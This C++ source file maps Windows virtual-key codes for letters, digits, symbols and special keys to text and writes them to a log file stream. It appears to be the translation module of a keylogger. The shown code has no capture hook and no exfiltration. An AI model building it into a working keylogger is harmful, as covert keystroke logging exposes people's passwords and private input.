#include "InputKeyHelper.h"


void check_letter(unsigned char pressedKey, std::ofstream& log,bool isShiftPressed) {
	switch (pressedKey){
		case 0x41:
			log << (isShiftPressed ? "A" : "a");
			break;
		case 0x42:
			log << (isShiftPressed ? "B" : "b");
			break;
		case 0x43:
			log << (isShiftPressed ? "C" : "c");
			break;
		case 0x44:
			log << (isShiftPressed ? "D" : "d");
			break;
		case 0x45:
			log << (isShiftPressed ? "E" : "e");
			break;
		case 0x46:
			log << (isShiftPressed ? "F" : "f");
			break;
		case 0x47:
			log << (isShiftPressed ? "G" : "g");
			break;
		case 0x48:
			log << (isShiftPressed ? "H" : "h");
			break;
		case 0x49:
			log << (isShiftPressed ? "I" : "i");
			break;
		case 0x4A:
			log << (isShiftPressed ? "J" : "j");
			break;
		case 0x4B:
			log << (isShiftPressed ? "K" : "k");
			break;
		case 0x4C:
			log << (isShiftPressed ? "L" : "l");
			break;
		case 0x4D:
			log << (isShiftPressed ? "M" : "m");
			break;
		case 0x4E:
			log << (isShiftPressed ? "N" : "n");
			break;
		case 0x4F:
			log << (isShiftPressed ? "O" : "o");
			break;
		case 0x50:
			log << (isShiftPressed ? "P" : "p");
			break;
		case 0x52:
			log << (isShiftPressed ? "R" : "r");
			break;
		case 0x53:
			log << (isShiftPressed ? "S" : "s");
			break;
		case 0x54:
			log << (isShiftPressed ? "T" : "t");
			break;
		case 0x55:
			log << (isShiftPressed ? "U" : "u");
			break;
		case 0x56:
			log << (isShiftPressed ? "V" : "v");
			break;
		case 0x5A:
			log << (isShiftPressed ? "Z" : "z");
			break;
		case 0x51:
			log << (isShiftPressed ? "Q" : "q");
			break;
		case 0x57:
			log << (isShiftPressed ? "W" : "w");
			break;
		case 0x59:
			log << (isShiftPressed ? "Y" : "y");
			break;
		case 0x58:
			log << (isShiftPressed ? "X" : "x");
			break;
		default:
			break;
	}
}


void check_digit(unsigned char pressedKey, std::ofstream& log, bool isShiftPressed) {
	switch (pressedKey){
		case 0x30:
			log << (isShiftPressed ? ")" : "0");
			break;
		case 0x31:
			log << (isShiftPressed ? "!" : "1");
			break;
		case 0x32:
			log << (isShiftPressed ? "@" : "2");
			break;
		case 0x33:
			log << (isShiftPressed ? "#" : "3");
			break;
		case 0x34:
			log << (isShiftPressed ? "$" : "4");
			break;
		case 0x35:
			log << (isShiftPressed ? "%" : "5");
			break;
		case 0x36:
			log << (isShiftPressed ? "^" : "6");
			break;
		case 0x37:
			log << (isShiftPressed ? "&" : "7");
			break;
		case 0x38:
			log << (isShiftPressed ? "*" : "8");
			break;
		case 0x39:
			log << (isShiftPressed ? "(" : "9");
			break;
		default:
			break;
	}
}


void check_special_character(unsigned char pressedKey, std::ofstream& log, bool isShiftPressed) {
	switch (pressedKey){
		case 0xBA:
			log << (isShiftPressed ? ":" : ";");
			break;
		case 0xBB:
			log << (isShiftPressed ? "+" : "=");
			break;
		case 0xBC:
			log << (isShiftPressed ? "<" : ",");
			break;
		case 0xBD:
			log << (isShiftPressed ? "_" : "-");
			break;
		case 0xBE:
			log << (isShiftPressed ? ">" : ".");
			break;
		case 0xBF:
			log << (isShiftPressed ? "?" : "/");
			break;
		case 0xC0:
			log << (isShiftPressed ? "~" : "`");
			break;
		case 0xDB:
			log << (isShiftPressed ? "{" : "[");
			break;
		case 0xDC:
			log << (isShiftPressed ? "|" : "\\");
			break;
		case 0xDD:
			log << (isShiftPressed ? "}" : "]");
			break;
		case 0xDE:
			log << (isShiftPressed ? "\"" : "'");
			break;
		default:
			break;
	}
}


void check_special_key(unsigned char pressedKey, std::ofstream& log) {
	switch (pressedKey){
		case VK_SPACE:
			log << "[Space]";
			break;
		case 0x2E:
			log << "[Delete]";
			break;
		case VK_BACK:
			log << "[BackSpace]";
			break;
		case VK_RETURN:
			log << "[Enter]";
			break;
		case VK_LCONTROL:
			log << "[Ctrl]";
			break;
		case VK_RCONTROL:
			log << "[Ctrl]";
			break;
		case VK_TAB:
			log << "[Tab]";
			break;
		case 0x25:
			log << "[Left Arrow]";
			break;
		case 0x26:
			log << "[Up Arrow]";
			break;
		case 0x27:
			log << "[Right Arrow]";
			break;
		case 0x28:
			log << "[Down Arrow]";
			break;
		case VK_ESCAPE:
			log << "[Esc]";
			break;
		case VK_CAPITAL:
			log << "[Caps Lock]";
			break;
		case VK_RSHIFT:
			log << "[Right Shift]";
			break;
		case VK_LSHIFT:
			log << "[Left Shift]";
			break;
		case VK_LMENU:
			log << "[Left Alt]";
			break;
		case VK_RMENU:
			log << "[Right Alt]";
			break;
		case VK_LWIN:
			log << "[Left Win]";
			break;
		case VK_RWIN:
			log << "[Right Win]";
			break;
		case VK_INSERT:
			log << "[Insert]";
			break;
		case VK_SCROLL:
			log << "[Scroll Lock]";
			break;
		case VK_HOME:
			log << "[Home]";
			break;
		case VK_END:
			log << "[End]";
			break;
		case VK_PRIOR:
			log << "[Page Up]";
			break;
		case VK_NEXT:
			log << "[Page Down]";
			break;
		case VK_SNAPSHOT:
			log << "[Print Screen]";
			break;
		case VK_F1:
			log << "[F1]";
			break;
		case VK_F2:
			log << "[F2]";
			break;
		case VK_F3:
			log << "[F3]";
			break;
		case VK_F4:
			log << "[F4]";
			break;
		case VK_F5:
			log << "[F5]";
			break;
		case VK_F6:
			log << "[F6]";
			break;
		case VK_F7:
			log << "[F7]";
			break;
		case VK_F8:
			log << "[F8]";
			break;
		case VK_F9:
			log << "[F9]";
			break;
		case VK_F10:
			log << "[F10]";
			break;
		case VK_F11:
			log << "[F11]";
			break;
		case VK_F12:
			log << "[F12]";
			break;
		case VK_NUMPAD0:
			log << "0";
			break;
		case VK_NUMPAD1:
			log << "1";
			break;
		case VK_NUMPAD2:
			log << "2";
			break;
		case VK_NUMPAD3:
			log << "3";
			break;
		case VK_NUMPAD4:
			log << "4";
			break;
		case VK_NUMPAD5:
			log << "5";
			break;
		case VK_NUMPAD6:
			log << "6";
			break;
		case VK_NUMPAD7:
			log << "7";
			break;
		case VK_NUMPAD8:
			log << "8";
			break;
		case VK_NUMPAD9:
			log << "9";
			break;
		default:
			break;
	}
}